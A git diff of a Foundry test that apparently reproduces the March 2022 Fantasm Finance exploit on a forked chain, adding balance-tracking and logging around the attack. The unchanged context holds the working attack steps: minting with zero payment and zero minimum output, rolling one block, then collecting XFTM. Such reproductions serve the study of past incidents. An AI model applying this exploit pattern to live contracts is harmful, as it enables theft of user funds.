@@ -5,6 +5,8 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../TestHarness.sol";
 import {IERC20} from "../interfaces/IERC20.sol";
 
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
+
 // forge test --match-contract Exploit_FantasmFinance -vvv
 /*
 On Mar 09, 2022 an attacker stole ~$2.62MM in XFTM tokens from an Fantasm Finance collateral reserve.
@@ -109,7 +111,7 @@ interface IFantasm {
 }
 
 
-contract Exploit_FantasmFinance is TestHarness {
+contract Exploit_FantasmFinance is TestHarness, TokenBalanceTracker {
 
     IERC20 fsm = IERC20(0xaa621D2002b5a6275EF62d7a065A865167914801);
     IERC20 xFTM = IERC20(0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F);
@@ -124,16 +126,27 @@ contract Exploit_FantasmFinance is TestHarness {
         cheat.prank(FANTOM_DEPLOYER); // Simulating initial attacker's balance
         fsm.transfer(address(this), ATTACKER_INITIAL_BALANCE); // https://ftmscan.com/tx/0xdfe2357a2105acaf36ffb54f1973d33460fa9160f8c4b12453bd1c5bcdab9560
         require(fsm.balanceOf(address(this)) == ATTACKER_INITIAL_BALANCE, "wrong initial balance");
+
+        addTokenToTracker(address(fsm));
+        addTokenToTracker(address(xFTM));
+
+        console.log("Before exploit");
+        updateBalanceTracker(address(this));
+        updateBalanceTracker(address(fantasmPool));
+
+        logBalancesWithLabel('Attacker', address(this));
+        logBalancesWithLabel('Pool', address(fantasmPool));
     }
 
     function test_attack() external {
-        console.log("Before exploit: xFTM of Attacker = ", xFTM.balanceOf(address(this)));
-        
         fsm.approve(address(fantasmPool), type(uint256).max); 
         fantasmPool.mint{value: 0}(fsm.balanceOf(address(this)), 0); // Passing 0 as _minXftmOut, msg.value == 0; https://tx.eth.samczsun.com/fantom/0x0c850bd8b8a8f4eb3f3a0298201499f794e0bfa772f620d862b13f0a44eadb82
         cheat.roll(32972130); // Jump one block before collection
         fantasmPool.collect(); // Collect tx https://ftmscan.com/tx/0x956e760143d3a029ae44fa2b60e8a7613ed937374b7e473109e3193e466f523a
-        console.log("After exploit: xFTM of Attacker = ", xFTM.balanceOf(address(this)));
+        
+        console.log("After exploit");
+        logBalancesWithLabel('Attacker', address(this));
+        logBalancesWithLabel('Pool', address(fantasmPool));
     }
    
 }
